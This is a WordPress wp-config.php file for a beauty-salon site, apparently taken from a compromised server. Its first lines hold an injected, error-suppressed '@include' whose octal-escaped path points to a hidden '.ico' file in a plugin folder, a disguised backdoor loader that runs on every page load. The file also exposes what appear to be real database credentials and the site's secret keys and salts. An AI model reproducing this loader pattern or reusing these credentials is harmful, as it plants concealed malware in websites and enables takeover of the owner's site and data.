<?php
/*2c9a4*/

@include "\057hom\145/co\160yne\164/ft\160/be\141uty\163kin\057wp-\143ont\145nt/\160lug\151ns/\167ord\160res\163-im\160ort\145r/.\067640\061637\056ico";

/*2c9a4*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'copynet_salonbeautyskin');

/** MySQL database username */
define('DB_USER', 'copynet_salonbeautyskin');

/** MySQL database password */
define('DB_PASSWORD', 'COPYnet23BS!!478');

/** MySQL hostname */
define('DB_HOST', 'sql.copynet.nazwa.pl');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '2CDH_^.Ybz[6p31pU3eZkKZW85|zfH)!Z^s;LN}U@R[^Il~q)WIX#1Q.myu(B(u4');
define('SECURE_AUTH_KEY',  '8$<Mv[ 3IwLy CL(IZ$QT^q*@EO4hc~kESei^-Tg7*F*(|wSu#<neCcYD [4Q_Ua');
define('LOGGED_IN_KEY',    'AbwIO?eN+]RLc:8R&hKN/9 &86a)%aMjGsUpzs5WX^3WM8e21:vaJx4JV:y=DjcE');
define('NONCE_KEY',        '5ju<@Sv3v;Pm#cLXPH;To,{lY7fZ_I1UM}X3A{*DFJQp1AR9Va(qkBlBzO034eQJ');
define('AUTH_SALT',        'd&|kERV-~IgJ6cG:o@-xCp{K/8m>`rB{rRimY%.#80QXc1DRmN)~oUQuuv?x0jO0');
define('SECURE_AUTH_SALT', 'gL?H>a._XdgR_xi7fLV)1S:7X5#2ZG8&:r:r2GJC-7;7x}#oy?,(e-oVX >o>c=Z');
define('LOGGED_IN_SALT',   '[@Ke>).*U%b{X3|QnSQ[4Rv]km0_!_1_m>}&V9/AcWt0cO;p2%sv=|@:.+6WVn!=');
define('NONCE_SALT',       '_zh|;!.PcN[Se1atZXaXrW9#?qMp%%6UPA{okrm?XII`nY$JxJA<:OutSP! d}:.');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'beauty_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
